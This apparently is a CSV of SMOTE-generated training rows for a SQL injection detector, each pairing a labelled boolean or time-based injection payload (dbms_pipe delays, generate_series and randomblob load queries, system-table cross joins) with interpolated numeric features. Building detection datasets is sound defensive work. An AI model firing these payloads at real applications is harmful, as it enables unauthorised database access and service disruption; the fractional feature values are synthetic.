id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000196,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,0.9393819605540973,79.84873195452937,23.0,3.339031807755384,18.493400590915982,13.0,36.35533136361339,12.0,0.23234705917295062,0.16299073817002305,0.45420921357700506,0.15045298908002128,0.6578674545546456,3.342132545445355,0.0,0.0,0.8355331363613387,1.1644668636386615,0.0,5.671066272722678,0.0,0.1644668636386613,0.16446686363866125,2.0,0.1644668636386613,0.8355331363613385,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000197,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,0.30661151561290356,167.159486613503,33.935345124115614,3.868315669778442,59.19181405144519,15.967672562057809,63.16163718971096,28.838362810289038,0.3535653740707836,0.09557416182971426,0.3783579557017418,0.17250250839776038,0.06465487588438434,3.0323274379421923,0.0,0.03232743794219217,0.0,1.0323274379421923,0.0,13.935345124115617,1.0323274379421923,1.9353451241156159,3.903017686173424,4.935345124115615,0.03232743794219217,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9676725620578077,0.0,0.0,0.0,0.0,1.0323274379421923,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.903017686173423,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.935345124115616
SMOTE_000198,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,1.980101277088101,154.21966547595616,35.66589964278685,3.9810622664366715,47.72081601177589,23.389016726202193,55.05491636898904,28.05491636898904,0.3084398186905744,0.1524938447095185,0.35743242564974453,0.18163391095016257,1.8329498213934234,0.3890167262021922,2.0,0.0,0.0,2.0,0.0,10.610983273797808,0.0,2.0,1.0,11.221966547595617,0.6109832737978078,0.38901672620219213,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.6109832737978078,0.0,1.0,0.0,0.6109832737978078,0.38901672620219213,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6109832737978076
SMOTE_000199,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,0.43909554481367125,97.81279829967013,29.129485592833582,3.598551772056727,32.0,13.0,40.294855928335814,12.517942371334325,0.3278400051525147,0.1331850020932091,0.4113264238099529,0.12764856894432325,1.0,1.1102230246251565e-16,0.2589711856671627,0.0,1.0,1.0,0.0,7.258971185667162,0.0,1.0,1.0,2.258971185667163,1.0,0.0,0.1294855928335814,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000200,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,1.60738626470091,92.3725927035384,23.921629784953762,3.2065224099928407,21.843259569907524,13.0,44.078370215046235,13.45096291858464,0.23500800734865995,0.14081459419116307,0.47825004867289844,0.14592734978727845,0.2745185407076802,2.901925837169279,0.0,0.0,1.0,1.0,0.0,7.72548145929232,0.0,0.27451854070768034,0.27451854070768045,2.0,0.27451854070768034,0.7254814592923197,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2745185407076804,0.0,0.0,0.27451854070768034,1.7254814592923196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2745185407076804
SMOTE_000201,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,0.356032651948939,154.41083290229815,34.20541645114908,3.870289513464452,58.64052121048911,10.667603466234509,58.89729177442546,26.205416451149077,0.3799262916939126,0.06889139829954836,0.3815112951750012,0.16967101483153785,0.1540623383618096,2.84593766163819,0.10270822557453962,0.0,0.0,1.0513541127872699,0.0,11.94864588721273,0.0,2.0,1.0,7.25677056393635,0.05135411278726987,0.9486458872127301,0.05135411278726987,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,1.0,0.0,0.05135411278726987,0.9486458872127301,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000202,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,1.951180896332912,122.35655521956642,28.841226312560476,4.13174685042172,73.84122631256048,5.103065781401188,28.88858418792333,14.523678937681426,0.6096323011924445,0.040042475262882404,0.23282622240563142,0.11749900113904174,3.420613156280238,1.1102230246251565e-16,0.0,0.0,1.0,1.4206131562802378,0.0,2.841226312560475,0.8412263125604753,0.0,2.0,2.420613156280238,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.4206131562802375,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4206131562802375
SMOTE_000203,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.10061084156167764,153.47699062938926,34.87930552985907,4.306428079314556,75.71837956967116,16.959768509953022,42.919537019906045,17.879305529859064,0.4933397423733892,0.11051374734425475,0.27968582960310356,0.1164606806792525,0.9597685099530214,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.9597685099530215,5.0,0.9597685099530214,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000204,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.6985717581644842,151.94214968583466,35.24210003696063,4.27467835928509,72.48954946407089,17.484200073921258,43.8473501293622,18.121050018480314,0.47529563187712026,0.11558205833371335,0.2895999375974447,0.1195223721917217,1.3631500554409421,1.1102230246251565e-16,1.7578999630393715,0.0,1.0,2.0,0.0,5.363150055440943,0.0,0.12105001848031421,2.757899963039372,5.0,1.0,0.0,0.878949981519686,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1210500184803143,0.0,1.0,1.0,0.12105001848031416,0.8789499815196857,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.1210500184803145
SMOTE_000205,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000001,0.6119892251749582,72.42676077984203,24.85693393613562,3.526776406440427,28.37988456247094,5.14257858151416,28.333008345099852,10.571289290757079,0.38068318857927946,0.06633249754481466,0.40313319003504633,0.1498511238408596,0.0,0.09521488179284665,2.0,0.0,1.0,2.0,0.0,2.2856446453785395,0.0,0.0,0.19042976358569308,5.904785118207154,0.0,0.09521488179284648,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.09521488179284665,0.9047851182071535,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000206,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.8138505649304563,137.89922580987079,32.17265689180643,4.213918968022457,69.34531378361288,14.791401757354953,38.72656891806435,15.035941350838613,0.5031470635099172,0.10790531342748805,0.28028921658120914,0.10865840648138556,0.1726568918064355,1.1102230246251565e-16,2.0,0.0,1.0,1.8273431081935645,0.0,4.517970675419306,0.17265689180643543,0.0,2.1726568918064353,4.827343108193564,0.1726568918064354,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8273431081935647,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8273431081935643
SMOTE_000207,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,2.161207754721829,73.71133109292066,23.86600672123805,3.682683550084841,18.979317650444543,16.17535797787286,26.845324371682597,11.711331092920648,0.2572253893338694,0.21986841654102612,0.36405715159250907,0.15884904253259538,2.845324371682596,0.2886689070793509,0.8660067212380527,0.0,0.0,2.0,0.0,3.711331092920649,0.0,1.0,1.0,2.866006721238053,0.7113310929206491,0.28866890707935094,0.28866890707935094,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2886689070793509,0.0,1.4226621858412984,0.28866890707935094,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000208,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,0.8188222477014265,86.95742902818738,23.851061289741054,3.3734178620046946,20.553183869223158,13.0,39.70212257948211,13.702122579482108,0.2361916625841335,0.1496287068790073,0.4567185221474369,0.1574611083894223,3.4042451589642138,0.5957548410357865,0.0,0.0,0.1489387102589465,1.8510612897410534,0.0,6.0,0.0,0.8510612897410534,0.8510612897410536,2.0,0.8510612897410534,0.14893871025894662,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000209,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,2.6434386155601075,130.98359299255168,30.77549902674329,4.136094272780231,71.88980038930268,6.330598832091948,36.32239532836779,16.440798442789266,0.5607014497000873,0.046010031953456584,0.26966741696513674,0.12362110138131938,1.8898003893026838,1.1102230246251565e-16,1.110199610697316,0.0,1.0,1.0,0.0,4.77549902674329,0.5550998053486581,0.0,2.555099805348658,3.1101996106973164,1.0,0.0,0.555099805348658,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.4449001946513419,0.5550998053486581,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000210,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,2.0642995709248124,149.62698401772587,33.504378759231926,4.152805536448594,76.5481663515512,12.530651314623489,43.05254511078312,17.495621240768074,0.5128494395754686,0.08224909987870994,0.28653546437668764,0.11836599616913387,0.0,1.0,2.0,0.0,1.0,1.5043787592319269,0.0,5.504378759231927,0.495621240768073,0.0,2.495621240768073,4.504378759231927,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5043787592319271,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.504378759231927
SMOTE_000211,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,1.5810978100775903,139.29861821447483,32.471231173496406,4.2169130446180585,69.4712311734964,16.0,38.88492469398562,14.942462346992809,0.49894502173985744,0.11493326350104908,0.278964463412509,0.10715725134658444,0.0,0.4712311734964042,2.0,0.0,1.0,2.0,0.0,4.471231173496404,0.0,0.0,2.0,5.0,0.0,0.47123117349640414,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.47123117349640425,0.5287688265035959,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000212,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000029,1.6452945102024,142.8772910069321,37.23509164027728,4.005067970959032,48.17545820138642,21.47018328055457,51.64564148194099,21.58600804305013,0.33787533100225875,0.1506259348603407,0.36188106392174957,0.14961767021565095,3.7649083597227158,1.1102230246251565e-16,0.47018328055456826,0.0,0.7649083597227158,2.0,0.0,8.705274920831853,0.0,1.2350916402772842,1.0,6.64564148194099,1.0,0.0,0.23509164027728413,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.23509164027728413,1.7649083597227158,0.0,1.0,0.7649083597227158,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.5298167194454315
SMOTE_000213,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000031,5.291975536856188,108.26313814726743,26.26315601402547,3.471351643571773,32.42104604908914,13.0,48.66665475549464,14.175437342683647,0.2961759229177333,0.13173990965530907,0.43459899228478155,0.13748517514217604,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,7.26315601402547,0.0,0.4561406643290884,0.4561406643290884,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5438593356709115,0.0,0.5438593356709116,0.0,0.0,0.0,1.4561406643290884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5438593356709115,0.5438593356709115,3.087718671341823
SMOTE_000214,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,0.3389251902625478,108.60075326229045,29.900053804449318,3.5063524373334176,32.0,13.0,48.000538044493176,15.60021521779727,0.2951492325385138,0.11990437571877123,0.44153620028806984,0.14341019145464512,1.0,1.1102230246251565e-16,1.8001076088986352,0.0,1.0,1.0,0.0,8.800107608898635,0.0,1.0,1.0,3.8001076088986356,1.0,0.0,0.9000538044493177,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000215,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,1.9358495853006095,89.59618655453878,25.07494158213005,3.344957305913171,22.1498831642601,13.0,41.26062248620437,13.185680904074314,0.24258239936289228,0.14795169189573465,0.46211619891246686,0.1473497098289062,0.29642022601857865,2.8143190959256854,0.5928404520371572,0.0,1.0,1.0,0.0,6.889260678055736,0.0,0.29642022601857865,0.29642022601857865,2.5928404520371573,0.29642022601857865,0.7035797739814214,0.2964202260185786,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2964202260185787,0.0,0.0,0.29642022601857865,1.7035797739814211,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.296420226018579
SMOTE_000216,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,0.2668897604782586,97.10184972202273,29.078703551573053,3.604627899191916,32.0,13.0,39.78703551573053,12.314814206292212,0.32999439478174925,0.13406022288008562,0.4093355369650799,0.12660984537308517,1.0,1.1102230246251565e-16,0.15740710314610618,0.0,1.0,1.0,0.0,7.157407103146106,0.0,1.0,1.0,2.157407103146106,1.0,0.0,0.07870355157305309,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000217,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000016,2.59352787728389,123.5813570871582,29.27131216106047,3.390372075361408,30.224796281855827,14.317828040265118,58.449592563711654,20.58914020132559,0.24380390316685266,0.11999129524730105,0.4705753730890123,0.16562942849683399,2.682171959734882,2.6356560805302363,0.0,0.6589140201325592,0.0,2.0,0.0,9.953484120795354,1.3178280402651181,0.34108597986744094,1.0,2.658914020132559,1.0,0.6589140201325591,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000218,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.514719490077244,103.74650699939474,29.553321928528195,3.54783928795273,32.0,13.0,44.53321928528195,14.213287714112782,0.3098590696988038,0.12588024706513906,0.4279427346979804,0.13631794853807672,1.0,1.1102230246251565e-16,1.1066438570563908,0.0,1.0,1.0,0.0,8.10664385705639,0.0,1.0,1.0,3.1066438570563912,1.0,0.0,0.5533219285281955,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000219,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,0.27513972353107197,147.1140956207352,32.923936252843184,4.086203208983705,71.53244623009769,9.0,46.733776884951155,19.847872505686375,0.4861754560885333,0.06117792015480195,0.3177098733747512,0.1349367503819135,1.0,1.1102230246251565e-16,1.9239362528431867,0.0,1.0,1.0,0.0,6.923936252843188,0.9619681264215935,0.0,3.0,3.9239362528431867,1.0,0.0,0.9619681264215935,0.038031873578406476,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.03803187357840665,0.9619681264215934,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000220,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000028,2.882591732789078,117.24590866670468,29.505854968254873,3.826225121094794,53.75176363495955,10.470725158725633,37.988290063490254,15.03512980952924,0.4396361889810965,0.09624039874475393,0.33637420049015565,0.12774921178399387,2.51756490476462,1.1102230246251565e-16,0.0,0.0,1.0,1.5058549682548734,0.0,5.48243509523538,1.0117099365097464,0.4941450317451267,1.5058549682548734,2.505854968254873,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.5058549682548732,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5058549682548734
SMOTE_000221,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,1.4412882737458332,119.73266338453811,29.21286991451918,4.17380497534837,72.51485203419233,4.455443897423018,28.821775589692074,13.940591863230692,0.6152886038318359,0.03532244177608265,0.23450179767184187,0.11488715672023961,2.514852034192327,1.1102230246251565e-16,0.4851479658076729,0.0,1.0,1.0,0.0,3.2128699145191826,0.24257398290383644,0.0,2.2425739829038367,2.485147965807673,1.0,0.0,0.24257398290383644,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.7574260170961635,0.24257398290383647,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000222,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,0.43532732334773283,90.0627591401549,22.0,2.9191808102354604,8.62759140154894,15.811722579535317,47.87448171969021,17.74896343938042,0.09572419450771258,0.17558618875649573,0.5315861924352483,0.19710342430054334,3.748963439380421,0.2510365606195789,0.9372408598451053,0.0,0.0627591401548947,1.9372408598451054,0.0,8.0,1.8744817196902108,0.0,0.9372408598451053,2.9372408598451054,0.9372408598451053,0.06275914015489464,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0627591401548946,0.9372408598451053,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000223,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,1.396931326596474,80.02815651869426,24.64404268691662,3.6247362215366343,24.014078259347134,13.0,31.014078259347134,12.0,0.29736071287994204,0.1646444207850471,0.3860154009949674,0.15197946534004347,3.1779786565416908,1.1102230246251565e-16,0.0,0.0,0.27400711448610304,1.725992885513897,0.0,4.822021343458309,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.27400711448610304,0.0,0.0,0.27400711448610304,1.7259928855138968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2740071144861034
